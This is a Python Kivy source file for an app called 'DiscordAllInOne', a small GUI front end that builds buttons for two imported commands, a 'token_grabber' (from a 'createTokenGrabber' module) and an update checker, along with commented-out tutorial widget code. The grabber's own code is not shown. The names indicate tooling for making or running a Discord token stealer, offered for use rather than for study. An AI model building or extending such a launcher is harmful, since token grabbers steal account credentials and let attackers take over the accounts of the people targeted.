from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.image import Image
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.lang import Builder
from util._1.createTokenGrabber import token_grabber
from util.plugins.update import search_for_updates

Builder.load_string("""
  
""")

class DiscordAllInOne(App):

  def build(self):
    self.commands = [token_grabber, search_for_updates]
    self.window = GridLayout()
    self.window.cols = 1
    self.window.size_hint = (0.6, 0.7)
    self.window.pos_hint = {"center_x": 0.5, "center_y": 0.5}
    for command in self.commands:
      self.button = Button(
        text = self.normalize(command.__name__),
        size_hint = (1, 0.5),
        bold = True,
      )
      self.button.bind(on_press=command)
      self.window.add_widget(self.button)

    # # add widgets to window
    # # image widget
    # self.window.add_widget(Image(source="logo.png"))
    # # Label widget
    # self.greeting = Label(
    #                       text="What's your name?",
    #                       font_size=18,
    #                       color='#00FFCE'
    #                       )
    # self.window.add_widget(self.greeting)
    # # text input widget
    # self.user = TextInput(
    #                       multiline=False,
    #                       padding_y = (20, 20),
    #                       size_hint = (1, 0.5)
    #                       )
    # self.window.add_widget(self.user)
    # # button widget
    # self.button = Button(
    #                       text="Greet",
    #                       size_hint = (1, 0.5),
    #                       bold = True,
    #                       background_color = '00FFCE',
    #                       background_normal = ""
    #                       )
    # self.button.bind(on_press=self.callback)
    # self.window.add_widget(self.button)

    return self.window

  def callback(self, instance):
    self.greeting.text = "Hello " + self.user.text + "!"

  def normalize(self, string: str) -> str:
    # string_list = string.split("_")
    return string.replace("_", " ").title()
    # return (" ".join(word for word in string_list)).title()

if __name__ == "__main__":
  DiscordAllInOne().run()